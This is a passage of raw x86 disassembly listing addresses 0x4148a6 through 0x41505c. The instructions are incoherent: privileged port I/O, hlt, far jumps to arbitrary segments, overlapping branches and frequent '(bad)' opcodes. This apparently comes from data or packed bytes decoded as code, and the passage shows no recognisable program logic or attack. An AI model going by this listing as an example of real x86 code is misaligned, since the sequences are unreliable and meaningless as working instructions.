  4148a6:	in     al,0xb1
  4148a8:	push   ebp
  4148a9:	loop   0x414866
  4148ab:	dec    edx
  4148ac:	js     0x4148c8
  4148ae:	jnp    0x4148d9
  4148b0:	sub    ecx,DWORD PTR [edx+0x1eee144d]
  4148b6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4148b8:	sbb    eax,0x6a70d893
  4148bd:	pop    ds
  4148be:	test   DWORD PTR [edi+0x3b],esi
  4148c1:	inc    ecx
  4148c2:	mov    ebx,0x177d40b8
  4148c7:	pop    es
  4148c8:	add    DWORD PTR [esi+ecx*4+0x6392bebe],esi
  4148cf:	fsub   DWORD PTR [ecx+0x684394e7]
  4148d5:	loope  0x4148e8
  4148d7:	xchg   edi,eax
  4148d8:	clc    
  4148d9:	adc    cl,dh
  4148db:	cld    
  4148dc:	ins    BYTE PTR es:[edi],dx
  4148dd:	or     BYTE PTR [edx],0x94
  4148e0:	popa   
  4148e1:	pop    edi
  4148e2:	arpl   WORD PTR [ecx],cx
  4148e4:	call   0xa12bf543
  4148e9:	mov    edi,0xf45b0c87
  4148ee:	jmp    0xbee4:0xc6b663b9
  4148f5:	sahf   
  4148f6:	clc    
  4148f7:	xor    al,cl
  4148f9:	sbb    al,0x88
  4148fb:	cmp    edi,eax
  4148fd:	xchg   edx,eax
  4148fe:	in     al,0x3d
  414900:	stos   DWORD PTR es:[edi],eax
  414901:	retf   0x3c10
  414904:	mov    esp,0x17cffeb7
  414909:	xchg   esp,eax
  41490a:	popf   
  41490b:	pop    es
  41490c:	push   ebx
  41490d:	out    0xab,al
  41490f:	mov    ah,0x87
  414911:	xchg   edx,eax
  414912:	add    DWORD PTR [ecx],esp
  414914:	push   0x44a91e5d
  414919:	mov    dl,0x7c
  41491b:	lock test al,0xaf
  41491e:	or     eax,0x9b69c7db
  414923:	inc    ebx
  414924:	ins    DWORD PTR es:[edi],dx
  414925:	mov    cl,0xd1
  414927:	out    0x7d,al
  414929:	je     0x4148c5
  41492b:	cmc    
  41492c:	mov    ch,0xbf
  41492e:	gs pusha 
  414930:	js     0x414974
  414932:	fld1   
  414934:	add    al,0xd3
  414936:	jecxz  0x414996
  414938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414939:	pusha  
  41493a:	iret   
  41493b:	push   ecx
  41493c:	call   0x1596f0f2
  414941:	ds jbe 0x41497e
  414944:	in     al,0x57
  414946:	pushf  
  414947:	pop    ds
  414948:	fidivr DWORD PTR [esi-0x3e]
  41494b:	adc    al,0x23
  41494d:	mov    ebx,0x645165f1
  414952:	sbb    BYTE PTR [eax],bl
  414954:	dec    eax
  414955:	iret   
  414956:	rol    edx,0x21
  414959:	in     al,dx
  41495a:	hlt    
  41495b:	sbb    eax,0xb10e0404
  414960:	in     eax,dx
  414961:	int    0xa
  414963:	fistp  WORD PTR [ecx]
  414965:	popa   
  414966:	inc    esp
  414967:	xor    DWORD PTR [ecx-0x2377ae5d],ebp
  41496d:	adc    eax,0xc38379a8
  414972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414973:	data16 jne 0x414965
  414976:	call   0x8559:0x96736812
  41497d:	cmp    BYTE PTR [ebx+0x22197055],bh
  414983:	es call 0xaf921a8a
  414989:	test   BYTE PTR [esi-0xa],0x7e
  41498d:	inc    esi
  41498e:	pop    ecx
  41498f:	dec    ecx
  414990:	inc    ebx
  414991:	adc    cl,al
  414993:	pop    edi
  414994:	adc    esi,esp
  414996:	cmp    BYTE PTR [ecx+0x46],0x9
  41499a:	xchg   ebp,eax
  41499b:	or     DWORD PTR [edx+0x2e],eax
  41499e:	sub    al,0x5a
  4149a0:	mov    eax,0xe699b048
  4149a5:	cdq    
  4149a6:	mov    ebx,?
  4149a8:	add    al,0x18
  4149aa:	pop    ds
  4149ab:	mov    ds:0x23fa1936,al
  4149b0:	std    
  4149b1:	js     0x41495b
  4149b3:	ret    0x5bdb
  4149b6:	pop    ebx
  4149b7:	add    ebx,edi
  4149b9:	in     al,dx
  4149ba:	cmp    eax,eax
  4149bc:	dec    ebx
  4149bd:	or     edi,ebx
  4149bf:	push   0x6a
  4149c1:	jae    0x4149d6
  4149c3:	jmp    0x4964:0x10d83c79
  4149ca:	adc    ebx,0xffffffd5
  4149cd:	sti    
  4149ce:	test   eax,0xcb734dbf
  4149d3:	xor    al,0xc3
  4149d5:	stos   DWORD PTR es:[edi],eax
  4149d6:	xchg   ebp,eax
  4149d7:	loop   0x4149ad
  4149d9:	and    eax,0xb941b96c
  4149de:	in     al,0xa2
  4149e0:	pop    esp
  4149e1:	pushf  
  4149e2:	into   
  4149e3:	adc    eax,0xd8107a66
  4149e8:	adc    bl,BYTE PTR [edx-0xf2144db]
  4149ee:	pop    ss
  4149ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f0:	addr16 xchg esp,eax
  4149f2:	dec    edx
  4149f3:	enter  0x82f9,0xea
  4149f7:	in     al,dx
  4149f8:	sub    al,0x1e
  4149fa:	mov    ds,ebx
  4149fc:	push   edx
  4149fd:	inc    ecx
  4149fe:	push   esp
  4149ff:	mov    ds:0xe0846f62,al
  414a04:	cdq    
  414a05:	popa   
  414a06:	outs   dx,BYTE PTR ds:[esi]
  414a07:	js     0x41498b
  414a09:	iret   
  414a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0b:	sub    bh,ch
  414a0d:	inc    esp
  414a0e:	mov    dh,0xfb
  414a10:	mov    dl,0xcb
  414a12:	cmp    dh,ah
  414a14:	je     0x414a5d
  414a16:	jns    0x4149cc
  414a18:	xchg   BYTE PTR [eax],ch
  414a1a:	dec    esp
  414a1b:	xchg   BYTE PTR [edi-0x4ced8376],ah
  414a21:	(bad)  
  414a22:	mov    dl,0xd
  414a24:	pop    ds
  414a25:	push   esi
  414a26:	out    dx,eax
  414a27:	mov    edx,0x6d1e1013
  414a2c:	pop    ebx
  414a2d:	loope  0x414a1d
  414a2f:	dec    edi
  414a30:	sbb    edx,DWORD PTR [edx+0x9]
  414a33:	imul   ecx,DWORD PTR [edx],0x3e
  414a36:	fcom   DWORD PTR [edx]
  414a38:	out    dx,eax
  414a39:	xchg   esp,eax
  414a3a:	sbb    al,0xec
  414a3c:	sbb    eax,0x4bab65ba
  414a41:	xlat   BYTE PTR ds:[ebx]
  414a42:	and    ch,BYTE PTR [ecx-0x27]
  414a45:	jl     0x414aa5
  414a47:	outs   dx,BYTE PTR ds:[esi]
  414a48:	adc    eax,0xef6892ee
  414a4d:	mov    eax,0xfbdf3973
  414a52:	fwait
  414a53:	fwait
  414a54:	lods   al,BYTE PTR ds:[esi]
  414a55:	jmp    0x414a6e
  414a57:	addr16 pop eax
  414a59:	(bad)  
  414a5b:	push   ds
  414a5c:	xchg   DWORD PTR [edi+0x5d],esi
  414a5f:	or     al,0x6f
  414a61:	xchg   ebx,eax
  414a62:	jmp    0x16e9:0x2d5f77b3
  414a69:	mov    edx,0xed47c861
  414a6e:	jne    0x414a05
  414a70:	test   BYTE PTR [ecx+0x7],ah
  414a73:	adc    eax,0xc16106fe
  414a78:	dec    esp
  414a79:	(bad)  
  414a7a:	mov    BYTE PTR [esi+ebp*2-0xeb25e3e],bl
  414a81:	xor    BYTE PTR [ebx],dh
  414a83:	mov    dh,0x7
  414a85:	xchg   edx,eax
  414a86:	sbb    edx,0x407ac99c
  414a8c:	and    dl,BYTE PTR ds:[ecx]
  414a8f:	and    ebx,DWORD PTR [ebx]
  414a91:	mov    eax,DWORD PTR [eax+esi*4+0x60]
  414a95:	imul   ecx,edx,0x8150aeea
  414a9b:	loop   0x414a94
  414a9d:	shr    BYTE PTR [edi-0xba193cb],cl
  414aa3:	cs popa 
  414aa5:	mov    esi,0x6972f50b
  414aaa:	sbb    eax,0xd07790da
  414aaf:	out    0x4e,eax
  414ab1:	jmp    0x78b7439e
  414ab6:	mov    ds:0x41767c90,eax
  414abb:	(bad)  [edi-0x552a8b0d]
  414ac1:	push   esp
  414ac2:	mov    esi,0xe667e2ae
  414ac7:	adc    al,0xc7
  414ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aca:	pop    ebx
  414acb:	pop    es
  414acc:	xor    bh,BYTE PTR [esi+0x130f0fe]
  414ad2:	xor    ch,ch
  414ad4:	inc    esi
  414ad5:	arpl   cx,dx
  414ad7:	(bad)  
  414ad8:	fs push cs
  414ada:	loop   0x414b20
  414adc:	or     DWORD PTR [edi-0x65],eax
  414adf:	cmc    
  414ae0:	ss jmp 0x85314f6b
  414ae6:	inc    ebp
  414ae7:	mov    al,0xe
  414ae9:	add    al,BYTE PTR [ecx+0x43647257]
  414aef:	lds    esi,FWORD PTR [edx+0x7b]
  414af2:	jecxz  0x414ad3
  414af4:	mov    BYTE PTR [edx+0x17],bh
  414af7:	jecxz  0x414aa6
  414af9:	jbe    0x414b14
  414afb:	fmul   DWORD PTR [edi]
  414afd:	adc    cl,BYTE PTR [eax-0x1799e109]
  414b03:	mov    bl,0x12
  414b05:	mov    BYTE PTR [edx],ah
  414b07:	aad    0x32
  414b09:	test   ch,0x4d
  414b0c:	repnz push 0x1c
  414b0f:	mov    esp,0xc8ffbb76
  414b14:	ins    BYTE PTR es:[edi],dx
  414b15:	mov    edx,0xdc01e491
  414b1a:	in     eax,dx
  414b1b:	fmul   QWORD PTR [ebp-0x2ab6a512]
  414b21:	cs in  al,0xbd
  414b24:	lahf   
  414b25:	xchg   edi,eax
  414b26:	std    
  414b27:	adc    dh,BYTE PTR [edi]
  414b29:	and    DWORD PTR [ebx+eiz*8],ebx
  414b2c:	pop    eax
  414b2d:	ss mov ebp,0x83e7371d
  414b33:	mov    DWORD PTR [edx-0x14],edi
  414b36:	jne    0x414acc
  414b38:	repnz or BYTE PTR [edx],al
  414b3b:	mov    ds:0xce037844,eax
  414b40:	jo     0x414aca
  414b42:	xlat   BYTE PTR ds:[ebx]
  414b43:	test   DWORD PTR [edi+0x312bc113],edx
  414b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b4a:	test   BYTE PTR [edi+0x49],ch
  414b4d:	out    dx,al
  414b4e:	jecxz  0x414b9e
  414b50:	jno    0x414b88
  414b52:	out    0x5,eax
  414b54:	sbb    al,BYTE PTR [edx+0x4a]
  414b57:	in     eax,0x5
  414b59:	cmp    edi,ebx
  414b5b:	outs   dx,BYTE PTR ds:[esi]
  414b5c:	aas    
  414b5d:	add    edi,esi
  414b5f:	push   0xffffffab
  414b61:	sbb    bh,BYTE PTR [ebp+0x1a]
  414b64:	push   eax
  414b65:	pop    ss
  414b66:	cs ins DWORD PTR es:[edi],dx
  414b68:	mov    ah,0xe6
  414b6a:	fcom   DWORD PTR [ecx]
  414b6c:	or     BYTE PTR [edx],0x6f
  414b6f:	mov    ah,0xb5
  414b71:	outs   dx,DWORD PTR ds:[esi]
  414b72:	or     al,0xe6
  414b74:	cmp    eax,DWORD PTR [ebp+0x5fbd8427]
  414b7a:	test   BYTE PTR [ebp+edx*1+0xe],ah
  414b7e:	and    ecx,DWORD PTR [edx-0x73fd120d]
  414b84:	xor    DWORD PTR ds:0x6c0bc369,ebx
  414b8a:	loop   0x414b81
  414b8c:	or     BYTE PTR [eax+0x675a5f7d],bl
  414b92:	daa    
  414b93:	je     0x414b5a
  414b95:	popf   
  414b96:	sub    dh,BYTE PTR [ebp+edx*2-0x20]
  414b9a:	sbb    al,0xe8
  414b9c:	retf   
  414b9d:	and    DWORD PTR [eax+0x15],ebx
  414ba0:	adc    edi,edx
  414ba2:	dec    esi
  414ba3:	pop    eax
  414ba4:	div    BYTE PTR [ecx-0x6438029]
  414baa:	mov    ecx,0xc8d91b3c
  414baf:	jnp    0x414bf7
  414bb1:	push   edi
  414bb2:	fld    QWORD PTR [edi-0x190df6e1]
  414bb8:	or     ah,BYTE PTR [ecx]
  414bba:	mov    al,0xe6
  414bbc:	pusha  
  414bbd:	mov    bl,0xc6
  414bbf:	adc    BYTE PTR [ebp-0x2],ah
  414bc2:	or     BYTE PTR [esi],bh
  414bc4:	sub    eax,0xa49bc233
  414bc9:	inc    BYTE PTR [esi+edx*1]
  414bcc:	fst    QWORD PTR [esi-0x15cc1f65]
  414bd2:	dec    al
  414bd4:	sub    BYTE PTR [ecx],cl
  414bd6:	fwait
  414bd7:	mov    ebp,0xfe607928
  414bdc:	or     ch,ch
  414bde:	neg    BYTE PTR [edi-0x1487ac3b]
  414be4:	jns    0x414bb8
  414be6:	jl     0x414b88
  414be8:	enter  0xdd08,0x79
  414bec:	out    0xb2,eax
  414bee:	sbb    al,cl
  414bf0:	mov    dh,0xb2
  414bf2:	xchg   edi,eax
  414bf3:	not    DWORD PTR cs:[ecx+0x22]
  414bf7:	fistp  WORD PTR [eax]
  414bf9:	or     edi,edi
  414bfb:	out    dx,eax
  414bfc:	push   edi
  414bfd:	and    eax,0x166cff05
  414c02:	dec    ecx
  414c03:	test   al,0x90
  414c05:	pop    eax
  414c06:	mov    ecx,DWORD PTR [esi-0x4b]
  414c09:	js     0x414c3e
  414c0b:	and    esi,ebp
  414c0d:	xlat   BYTE PTR ds:[ebx]
  414c0e:	cmc    
  414c0f:	push   edx
  414c10:	gs stos DWORD PTR es:[edi],eax
  414c12:	(bad)  
  414c13:	out    dx,eax
  414c14:	cmp    ebp,DWORD PTR [edi+0x62c77806]
  414c1a:	xor    ax,0xb453
  414c1e:	xor    eax,0x4b321c66
  414c23:	or     ebp,DWORD PTR [eax+edi*1+0x1b0f5112]
  414c2a:	xor    DWORD PTR [eax+0x4acdb6d1],ebp
  414c30:	icebp  
  414c31:	cli    
  414c32:	out    0xb0,al
  414c34:	push   cs
  414c35:	xor    DWORD PTR [edx+0x56],esp
  414c38:	sbb    DWORD PTR [ebx-0x80697e3],0x39
  414c3f:	jg     0x414cb8
  414c41:	add    al,0x22
  414c43:	aaa    
  414c44:	push   ds
  414c45:	bound  edi,QWORD PTR [edx-0x76]
  414c48:	xchg   edi,eax
  414c49:	(bad)  
  414c4a:	mov    al,ds:0x213411ec
  414c4f:	or     al,0x46
  414c51:	inc    edi
  414c52:	sub    al,0x4
  414c54:	out    dx,eax
  414c55:	dec    esi
  414c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c57:	lods   al,BYTE PTR ds:[esi]
  414c58:	xor    cl,BYTE PTR [ecx]
  414c5a:	cmp    ebp,edx
  414c5c:	(bad)  
  414c5d:	cld    
  414c5e:	cmp    al,0xda
  414c60:	imul   ebx,ebp,0x28
  414c63:	xchg   edx,eax
  414c64:	or     ebx,ecx
  414c66:	xor    dh,al
  414c68:	cmp    dl,dl
  414c6a:	xor    DWORD PTR [esp+ebp*2+0x20],esi
  414c6e:	pop    ss
  414c6f:	popf   
  414c70:	mov    es,WORD PTR [ecx-0x4a]
  414c73:	mov    edi,eax
  414c75:	mov    ch,0x9c
  414c77:	popa   
  414c78:	into   
  414c79:	xor    DWORD PTR [edi],esi
  414c7b:	(bad)  
  414c7c:	xor    eax,0x389fc661
  414c81:	imul   ebx,DWORD PTR ds:0x2796ba77,0xffffff8f
  414c88:	ss mov esi,0x12f375dc
  414c8e:	fbstp  TBYTE PTR [edx]
  414c90:	out    0x5c,eax
  414c92:	jecxz  0x414c15
  414c94:	dec    esi
  414c95:	test   DWORD PTR [esi+ebp*4+0x76],0x18309d1b
  414c9d:	fist   WORD PTR [ebx+0x1fe90957]
  414ca3:	rol    BYTE PTR [edx+0x7751ce7a],cl
  414ca9:	lea    ebp,[edx]
  414cab:	dec    ebp
  414cac:	mov    dh,0x6b
  414cae:	adc    al,0x4
  414cb0:	sar    BYTE PTR [edi+eax*2+0x540d7eb0],0x34
  414cb8:	cwde   
  414cb9:	push   ecx
  414cba:	push   edi
  414cbb:	ror    DWORD PTR [ebp*8+0x1a8a89f7],0x91
  414cc3:	adc    ebx,ecx
  414cc5:	cmp    edi,DWORD PTR [esi-0x60]
  414cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc9:	and    bh,cl
  414ccb:	loopne 0x414ca8
  414ccd:	pop    ecx
  414cce:	push   ecx
  414ccf:	shl    edi,0xf9
  414cd2:	sub    edx,esi
  414cd4:	adc    al,0x54
  414cd6:	mov    eax,0x1ea59e68
  414cdb:	sub    eax,0xbb15e51
  414ce0:	fbstp  TBYTE PTR [eax+0x260d82e7]
  414ce6:	xchg   esp,eax
  414ce7:	mov    ebx,0x15571c0f
  414cec:	push   es
  414ced:	shr    DWORD PTR [eax+0x5665c6a0],cl
  414cf3:	cmp    ebx,DWORD PTR [esi]
  414cf5:	aad    0xbe
  414cf7:	adc    eax,0x2330c070
  414cfc:	sub    DWORD PTR [esi+ecx*1-0x2],0xd0f3007b
  414d04:	jae    0x414d60
  414d06:	xor    BYTE PTR [edi-0x2064dea1],0x69
  414d0d:	loop   0x414d0d
  414d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d10:	mov    dl,0x19
  414d12:	add    esp,DWORD PTR [ebx]
  414d14:	add    ebx,DWORD PTR [esi+edi*2]
  414d17:	loop   0x414d74
  414d19:	mov    bl,0xda
  414d1b:	jnp    0x414cfc
  414d1d:	stos   DWORD PTR es:[edi],eax
  414d1e:	cwde   
  414d1f:	xor    BYTE PTR ds:0x72513738,dh
  414d25:	add    ch,ah
  414d27:	out    dx,al
  414d28:	sub    al,0x3e
  414d2a:	cmc    
  414d2b:	cmp    BYTE PTR [edx],bl
  414d2d:	popf   
  414d2e:	inc    ebx
  414d2f:	xchg   ecx,eax
  414d30:	push   edx
  414d31:	(bad)  
  414d32:	fistp  DWORD PTR [ebx]
  414d34:	leave  
  414d35:	pop    ebx
  414d36:	and    ecx,DWORD PTR [ebp-0x377cd6b4]
  414d3c:	fwait
  414d3d:	push   edi
  414d3e:	in     al,dx
  414d3f:	sub    eax,0x61a32191
  414d44:	dec    ebp
  414d45:	push   0xffffffae
  414d47:	in     eax,dx
  414d48:	push   ds
  414d49:	mov    al,0xea
  414d4b:	or     al,0xaa
  414d4d:	in     eax,0x6c
  414d4f:	push   ss
  414d50:	sar    DWORD PTR [ecx+0x6ba63652],1
  414d56:	add    eax,0x6ecda93a
  414d5b:	mov    ds:0x2bd76fe2,eax
  414d60:	inc    esp
  414d61:	jecxz  0x414d61
  414d63:	sub    eax,0x6225a810
  414d69:	mov    dl,0x3
  414d6b:	je     0x414db7
  414d6d:	jae    0x414d4f
  414d6f:	xchg   edi,eax
  414d70:	dec    edx
  414d71:	mov    esi,0x7ab2277e
  414d76:	xchg   edx,eax
  414d77:	jno    0x414d18
  414d79:	sbb    dl,BYTE PTR [edi-0x4b]
  414d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d7d:	gs inc eax
  414d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d80:	xchg   esp,eax
  414d81:	or     edi,edx
  414d83:	sub    edx,ecx
  414d85:	xchg   ebp,eax
  414d86:	fimul  DWORD PTR [ecx-0x17]
  414d89:	push   ss
  414d8a:	aad    0x60
  414d8c:	pop    edx
  414d8d:	xchg   ecx,eax
  414d8e:	stc    
  414d8f:	lods   eax,DWORD PTR ds:[esi]
  414d90:	test   DWORD PTR [edi-0x2f],edx
  414d93:	mov    edx,0xf2dc5d2d
  414d98:	or     dl,0xc9
  414d9b:	jmp    0x414d64
  414d9d:	in     eax,0xb3
  414d9f:	push   edi
  414da0:	and    edx,DWORD PTR fs:[esi-0x3b6eb303]
  414da7:	popf   
  414da8:	jae    0x414dd1
  414daa:	test   eax,0x513b68c3
  414daf:	(bad)  
  414db0:	mul    BYTE PTR [esi]
  414db2:	ror    BYTE PTR [eax+0x1b83a902],cl
  414db8:	rcl    BYTE PTR [edx-0x23],1
  414dbb:	fincstp 
  414dbd:	push   edx
  414dbe:	outs   dx,DWORD PTR ds:[esi]
  414dbf:	xor    BYTE PTR [ebp+0x103a6228],0x42
  414dc6:	in     al,0x24
  414dc8:	xor    ebp,DWORD PTR [ebp+0x62dc9296]
  414dce:	dec    esp
  414dcf:	add    BYTE PTR [edx],dh
  414dd1:	cwde   
  414dd2:	or     DWORD PTR [esi-0x55760ddf],ebp
  414dd8:	fidiv  WORD PTR [esi]
  414dda:	cli    
  414ddb:	mov    ds:0xf837486f,eax
  414de0:	cmp    al,0x51
  414de2:	jg     0x414d7b
  414de4:	(bad)  
  414de5:	cld    
  414de6:	and    esp,ebp
  414de8:	fstp   DWORD PTR ds:0x20ae8413
  414dee:	push   0xfffffffb
  414df0:	and    DWORD PTR [ebp+0x20],esi
  414df3:	add    cl,BYTE PTR [ebp-0xb]
  414df6:	xor    BYTE PTR [eax+0x2e],bl
  414df9:	imul   esi,DWORD PTR [ebp-0x79],0x72a373ff
  414e00:	stc    
  414e01:	test   BYTE PTR [edi+0x1e8c5e65],0x2b
  414e08:	or     al,0xec
  414e0a:	std    
  414e0b:	fstp   DWORD PTR [ecx+0x10]
  414e0e:	mov    bh,BYTE PTR [ecx]
  414e10:	xor    al,bh
  414e12:	retf   0x5027
  414e15:	test   al,0x6c
  414e17:	mov    esp,0x37e3692f
  414e1c:	and    BYTE PTR [edx+esi*1],bl
  414e1f:	imul   ebp,DWORD PTR [ecx+0x41],0xb53a88ec
  414e26:	(bad)  
  414e27:	mov    ebp,0xab18f551
  414e2c:	idiv   BYTE PTR [edx-0x1274cc91]
  414e32:	mov    ?,ebp
  414e34:	inc    ebx
  414e35:	sbb    ecx,DWORD PTR [eax+0x65]
  414e38:	lods   al,BYTE PTR ds:[esi]
  414e39:	stos   BYTE PTR es:[edi],al
  414e3a:	out    0xee,eax
  414e3c:	or     dl,dh
  414e3e:	jb     0x414e25
  414e40:	sbb    bl,BYTE PTR [esp+ebp*1]
  414e43:	call   0xad98550a
  414e48:	mov    ebp,0xe3780bb3
  414e4d:	div    BYTE PTR [edi+0x14]
  414e50:	popa   
  414e51:	and    BYTE PTR [eax-0x29],cl
  414e54:	aas    
  414e55:	test   al,0x30
  414e57:	leave  
  414e58:	popa   
  414e59:	cmp    sp,WORD PTR ss:[edx]
  414e5d:	ss push ecx
  414e5f:	adc    eax,0xe15a7812
  414e64:	aam    0xdc
  414e66:	or     BYTE PTR [edi-0x31],ch
  414e69:	cli    
  414e6a:	repz or al,0xd9
  414e6d:	push   0x3b
  414e6f:	inc    BYTE PTR [ecx+0x30]
  414e72:	and    eax,DWORD PTR [ebp-0x34fec548]
  414e78:	pop    edi
  414e79:	stc    
  414e7a:	dec    edx
  414e7b:	scas   eax,DWORD PTR es:[edi]
  414e7c:	mov    ebx,0xcf8732d6
  414e81:	outs   dx,DWORD PTR ds:[esi]
  414e82:	inc    edi
  414e83:	das    
  414e84:	jmp    0x414e58
  414e86:	scas   al,BYTE PTR es:[edi]
  414e87:	lahf   
  414e88:	(bad)  
  414e89:	pushf  
  414e8a:	call   0x431bfd2a
  414e8f:	lahf   
  414e90:	lock retf 
  414e92:	ss inc esp
  414e94:	pop    eax
  414e95:	aam    0x6c
  414e97:	jp     0x414ef2
  414e99:	jo     0x414e9d
  414e9b:	stc    
  414e9c:	or     edx,esi
  414e9e:	aaa    
  414e9f:	int    0x19
  414ea1:	mov    esp,DWORD PTR [edi-0x2541fef0]
  414ea7:	adc    al,0xd6
  414ea9:	outs   dx,DWORD PTR ds:[esi]
  414eaa:	scas   eax,DWORD PTR es:[edi]
  414eab:	aas    
  414eac:	(bad)  
  414eae:	arpl   WORD PTR [ecx-0x62],sp
  414eb1:	(bad)  
  414eb2:	mov    al,ds:0xa4b7535b
  414eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eb8:	je     0x414ea2
  414eba:	and    dh,BYTE PTR [edx]
  414ebc:	or     dl,al
  414ebe:	fcomp  DWORD PTR [ebp-0x6efd56f0]
  414ec4:	daa    
  414ec5:	outs   dx,BYTE PTR ds:[esi]
  414ec6:	(bad)  
  414ec7:	mov    bh,0xb0
  414ec9:	rcl    bl,1
  414ecb:	and    al,0xa2
  414ecd:	fild   QWORD PTR [edx-0x6b]
  414ed0:	jmp    0x8401:0xa1fe2365
  414ed7:	inc    edi
  414ed8:	xlat   BYTE PTR ds:[ebx]
  414ed9:	fisub  DWORD PTR ds:0x95a11dfd
  414edf:	sbb    DWORD PTR [ebx+eax*2],ebx
  414ee2:	inc    edi
  414ee3:	xor    ecx,ebx
  414ee5:	cwde   
  414ee6:	call   0x562e0f96
  414eeb:	mov    dh,0xc3
  414eed:	(bad)  
  414eee:	call   0x95c7fff0
  414ef3:	retf   
  414ef4:	xchg   edi,eax
  414ef5:	mov    ebx,0x16a906ee
  414efa:	inc    ebx
  414efb:	cmp    BYTE PTR [ebx-0x70],al
  414efe:	cdq    
  414eff:	dec    ebx
  414f00:	call   DWORD PTR [ecx+0x39101077]
  414f06:	pop    ebp
  414f07:	nop
  414f08:	and    BYTE PTR [edi+0x41],ch
  414f0b:	xchg   edx,eax
  414f0c:	rol    BYTE PTR [edx+0x7c56aeb4],cl
  414f12:	adc    BYTE PTR [ebx],ah
  414f14:	push   edi
  414f15:	pop    ds
  414f16:	jbe    0x414f56
  414f18:	adc    dh,BYTE PTR [ebp-0xe72c91d]
  414f1e:	ja     0x414eeb
  414f20:	jl     0x414ef4
  414f22:	xor    al,0xd5
  414f24:	stc    
  414f25:	xchg   ebp,eax
  414f26:	mov    eax,0x78de35e4
  414f2b:	mov    gs,WORD PTR [edi-0x68ea6fa]
  414f31:	push   es
  414f32:	leave  
  414f33:	xchg   ecx,eax
  414f34:	mov    ecx,0x286c3227
  414f39:	(bad)  
  414f3b:	or     edi,DWORD PTR [ecx-0x18]
  414f3e:	clc    
  414f3f:	mov    dl,0x38
  414f41:	mov    ah,0xae
  414f43:	mov    ebx,DWORD PTR [edx-0x570b94e4]
  414f49:	xchg   BYTE PTR [esi+0x24],bl
  414f4c:	sbb    al,0xee
  414f4e:	aad    0xcf
  414f50:	pop    ecx
  414f51:	inc    eax
  414f52:	xor    esp,edi
  414f54:	ins    DWORD PTR es:[edi],dx
  414f55:	repz call 0x63a8:0x6951545d
  414f5d:	stos   BYTE PTR es:[edi],al
  414f5e:	mov    ebp,0x25335193
  414f63:	mov    ds:0x84bc39d,al
  414f68:	adc    DWORD PTR [esi-0x69],0xa8396796
  414f6f:	hlt    
  414f70:	or     ebx,DWORD PTR [esi+0x54]
  414f73:	(bad)  
  414f75:	imul   eax,DWORD PTR [ebx],0x6c
  414f78:	std    
  414f79:	(bad)  
  414f7a:	mov    ebp,0xe05a5bf2
  414f7f:	popf   
  414f80:	xchg   bl,cl
  414f82:	js     0x414f48
  414f84:	adc    bl,BYTE PTR [ecx-0x50]
  414f87:	scas   al,BYTE PTR es:[edi]
  414f88:	std    
  414f89:	add    ebx,edx
  414f8b:	push   ecx
  414f8c:	cmp    al,0x2b
  414f8e:	test   al,0x23
  414f90:	mov    esi,0xa021a2b0
  414f95:	scas   eax,DWORD PTR es:[edi]
  414f96:	(bad)  
  414f97:	(bad)  
  414f98:	clc    
  414f99:	cmp    al,bh
  414f9b:	pop    ebx
  414f9c:	mov    ch,0xe9
  414f9e:	jne    0x414ffc
  414fa0:	add    bl,ah
  414fa2:	sub    ah,BYTE PTR [edx]
  414fa4:	mov    eax,ds:0x7e888238
  414fa9:	mov    eax,DWORD PTR [edi+0x38]
  414fac:	fs into 
  414fae:	icebp  
  414faf:	aaa    
  414fb0:	or     eax,DWORD PTR [edx]
  414fb2:	sbb    eax,0x38eb2dd
  414fb7:	or     dh,BYTE PTR [esi-0xab7a7f3]
  414fbd:	inc    eax
  414fbe:	xor    eax,0x3c02ccf1
  414fc3:	pop    esi
  414fc4:	jne    0x414f69
  414fc6:	std    
  414fc7:	pop    ds
  414fc8:	test   DWORD PTR [edi],0xc7d7c8d8
  414fce:	mov    ebx,0xb083d1db
  414fd3:	sbb    al,BYTE PTR [ebx]
  414fd5:	les    edi,FWORD PTR [edi-0x62]
  414fd8:	mov    cl,BYTE PTR [ecx+0x3d11e3a0]
  414fde:	or     eax,DWORD PTR [edx+ecx*4]
  414fe1:	sub    eax,DWORD PTR [esi+0x48]
  414fe4:	jmp    0xd06cb184
  414fe9:	std    
  414fea:	inc    edx
  414feb:	mov    dh,0x5f
  414fed:	add    ah,ah
  414fef:	pop    ds
  414ff0:	inc    edx
  414ff1:	jp     0x414fc7
  414ff3:	jnp    0x414fd9
  414ff5:	add    BYTE PTR [ecx],ch
  414ff7:	ret    0xfcb3
  414ffa:	cmp    dl,BYTE PTR [esi+0x1549d6d6]
  415000:	call   0x532f:0x5f21a730
  415007:	inc    ebp
  415008:	and    ah,dl
  41500a:	call   0x3ea:0xf93ccef1
  415011:	call   0x8e13:0x9a74dae0
  415018:	les    esi,FWORD PTR [ebp-0x621fa760]
  41501e:	xor    al,0x8b
  415020:	sub    DWORD PTR [ebx+0x44],ecx
  415023:	sub    eax,0x9304847a
  415028:	sbb    cl,ah
  41502a:	pop    ds
  41502b:	pop    ecx
  41502c:	mov    ebp,0x3b997ee1
  415031:	sti    
  415032:	xchg   ecx,eax
  415033:	jmp    0x41501f
  415035:	mov    eax,ds:0xadf9c602
  41503a:	or     eax,DWORD PTR [esi+eax*1]
  41503d:	xchg   edi,eax
  41503e:	ins    DWORD PTR es:[edi],dx
  41503f:	mov    ebp,0xdc4f093
  415044:	daa    
  415045:	repnz (bad) 
  415047:	pop    edi
  415048:	popf   
  415049:	jg     0x415077
  41504b:	xchg   DWORD PTR [ebp-0x1e],eax
  41504e:	out    dx,al
  41504f:	jnp    0x4150bc
  415051:	sub    al,0xaf
  415053:	jo     0x41506f
  415055:	pop    edi
  415056:	sub    eax,0x6406805e
  41505b:	push   edi
  41505c:	jbe    0x4150c7
